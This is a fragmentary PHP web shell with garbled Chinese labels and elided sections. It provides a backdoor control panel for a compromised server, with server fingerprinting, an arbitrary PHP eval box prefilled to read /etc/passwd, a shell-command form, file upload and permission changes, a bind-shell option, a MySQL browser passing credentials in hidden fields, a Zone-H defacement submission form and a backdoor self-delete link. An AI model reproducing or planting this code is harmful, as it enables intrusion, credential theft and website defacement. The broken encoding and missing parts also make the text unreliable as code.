...
·þÎñÆ÷IP: ".gethostbyname($_SERVER["HTTP_HOST"])."    ÄãµÄIP: ".$_SERVER['REMOTE_ADDR']."    PHP°æ±¾: ".phpversion()."    Apache/IIS: ".$_SERVER['SERVER_SOFTWARE']."    ²Ù×÷ÏµÍ³: ".php_uname()."</textarea>";
?>
<center>
<div id="menu">
<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">Ö÷Ä¿Â¼</a>
<a href="?action=files">ÎÄ¼þ¹ÜÀí</a>
<a href="?turnoff=ini">PHP.INI</a>
<a href="?action=upload">ÎÄ¼þÉÏ´«</a>
<a href="?action=encoders">encoders</a>
<a href="?action=bind">°ó¶¨</a>
...
<a href="?action=tools">¹¤¾ß</a>
<a href="?action=phpinfo">phpinfo</a>
<a href="?action=logout" onclick="alert('Äã½«ÍË³öµÇÂ¼£¡')">ÍË³öµÇÂ¼</a>
<a href="?action=kill">ºóÃÅ×ÔÉ±</a>
</div>
<div id="det">
<?php
if(ini_get('safe_mode') == '1'){
echo '<font color="#00ff00"> °²È«Ä£Ê½:</font><font color="red"> ON</font></font>';
}
else{
echo '<font color="#00ff00"> °²È«Ä£Ê½:</font><font color="green"> OFF</font>';
}
...
<div id="det">
<?php
echo '<font color="#00ff00"> ½ûÖ¹º¯Êý: </font>';
...
<input type="text" name="evalit" value="file_get_contents('/etc/passwd');"><input type="submit" value="Ö´ÐÐ">
</form>
<?php
...
<input type="submit" value="Ö´ÐÐ"></form>
...
<center><font color="#00ff00">Folder:</font> <input type="text" value="'.getcwd().'" name="dir" style="border-top:none;"><br/><input type="submit" value="Ö´ÐÐ" style="border-top:none;"></center>
</form>';
}
else{
...
echo $result;	
echo '</select><br/><input type="hidden" value="'.$host.'" name="host"><input type="hidden" value="'.$user.'" name="user"><input type="hidden" value="'.$pass.'" name="pass"><input type="hidden" value="3" name="main"><input type="submit" value="Ö´ÐÐ"></form></center></div>';
mysql_close();
}
...
<td style='background-color:#666;padding-left:10px;'><h2 style="color:#00cc00"><center>Zone-H ºÚÒ³Ìá½»</center></h2></td></tr><tr><td height='45' colspan='2'><form method="post">
...
<br /><input type="submit" value="Ìá½»ºÚÒ³ !" name="SendNowToZoneH" /></center>
...
Ip finder ./x-h4ck
<form action="" method="post">
<input type="text" value="exploit-db.com" name="site"><input type="submit" name="submit" value="Ö´ÐÐ">
</form>
<h2>CMS Fack</h2>
...
<input type="hidden" name="action" value="tools">
<input type="submit" value="Ö´ÐÐ" style="border-top:0"><br />
</form>
</div>
<?php } ?>
...
<form action="" method="get">
<font color="#00ff00"><b>&nbsp;&nbsp;&nbsp;&nbsp;¸ü¸ÄÄ¿Â¼</b></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" value="<?php if(empty($_GET['go'])){echo getcwd();}else{echo $_GET['go'];} ?>" name="go">
<input type="hidden" name="action" value="files">
<input type="submit" value="Ö´ÐÐ">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>&nbsp;&nbsp;&nbsp;&nbsp;´´½¨Ä¿Â¼</b></font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" value="name" name="newdir">
...
$dir = getcwd();
	...
	if(is_dir($dir))
    {
        $handle = opendir($dir);
        {
				...
				?>
				<br/>
				&nbsp;&nbsp;&nbsp;&nbsp;&#171;<a style="color:red" href="<?php echo $_SERVER['PHP_SELF'].'?action=files&go='.getcwd(); ?>/../">·µ»Ø</a>&nbsp;&nbsp;&nbsp;&nbsp;
				<a style="color:red" href="<?php echo $_SERVER['HTTP_REFERER']; ?>">&nbsp;&nbsp;&nbsp;&nbsp;Ç°½ø</a>&nbsp;&nbsp;&#187;<br/>
				<?php
...
<div id="commands">
<form action="" method="get">
<font color="#00ff00"><b>Ö´ÐÐÃüÁî</b></font> <input type="text" name="command" value="ls -la">
<input type="submit" value="Ö´ÐÐ">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>Ô¤ÖÃÃüÁî</b></font> 
<select name="command">
...
<form action="" method="get">
<font color="#00ff00"><b>´´½¨ÎÄ¼þ &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</b></font> <input type="text" id="move" name="make">
<input type="submit" value="Ö´ÐÐ">
</form><br/>
<form action="" method="get">
<font color="#00ff00"><b>ÎÄ¼þÈ¨ÏÞ &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;&nbsp;</b></font> <input type="text" name="thefile" value="File Name" style="width:110px">
<input type="text" name="thefileval" value="0777" style="width:44px">
<input type="submit" value="Ö´ÐÐ"> <span style="color: #00ff00;font-family: Tahoma, Geneva, sans-serif;font-size:12px;"> ~~~~ </span>
<select name="comm">
<option>chmod</option>
<option>chown</option>
<option>chgrp</option>
...
<font color="#00ff00"><b>ÉÏ´«ÎÄ¼þ</b></font> <input type="file" name="upload"> <b>ÉÏ´«µ½...</b> <input type="text" name="location" value="<?php if(isset($_GET['path'])){echo $_GET['path'];} ?>">
<input type="submit" value="Ö´ÐÐ">
</form><br/></center>
<?php
}
